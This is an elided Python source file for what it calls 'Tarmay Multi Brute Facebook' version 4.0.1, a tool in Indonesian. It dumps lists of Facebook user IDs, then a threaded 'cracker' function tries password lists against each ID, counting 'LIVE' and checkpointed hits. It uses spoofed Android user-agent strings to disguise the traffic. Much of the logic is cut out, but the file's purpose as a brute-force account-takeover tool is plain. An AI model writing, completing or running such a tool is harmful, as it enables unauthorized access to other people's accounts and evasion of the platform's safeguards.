...
from concurrent.futures import ThreadPoolExecutor as Tarmay 
...
console = Console()
sys.stdout.write('\x1b]2; BMBF | Tarmay Multi Brute Facebook\x07')
#▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬[ USER-AGENT ]▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬#
pretty.install()
CON=sol()
ugen2=[]
...
try:
	...
	print(' ╰─  Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota Anda Ya Salam Dari Tarmay')
...
║Version  : 4.0.1                       
╚══════════════════════════════════════════╝
             """,width=95,title=f"Tarmay☠",style=f"red "))
#▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬[ BAGIAN-MASUK ]▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬#
def login123():
	os.system('clear')
	banner()
...
def TaRmAy_dump():
	...
	try:
		...
		print('')
		print(f'\033[1;36m└\033[1;32m[HAMU ID]: {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
...
def dump_massal():
	...
	for userr in uid:
		try:
			...
			exit()
	try:
		print(f'\033[1;36m└[HAMU ID] : {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		#print(' ╰─  Unstable Signal ')
...
def cracker(idf,pwv):
	...
	ses = requests.Session()
	prog.update(des,description=f"{h}TaRmAy☠☠{x} {loop}/{len(id)} LIVE ! [bold green]{ok}[/] CHECK ! [bold red]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
  ...
  #  os.system('clear')
    try:
        ...
        if response.status_code == 200:
            ...
            uascrap.append("Mozilla/5.0 (Linux; Android 11; TaRmAyFB) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36")
    except requests.exceptions.ConnectionError:
        uascrap.append("Mozilla/5.0 (Linux; Android 11; TaRmAyFB) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36")
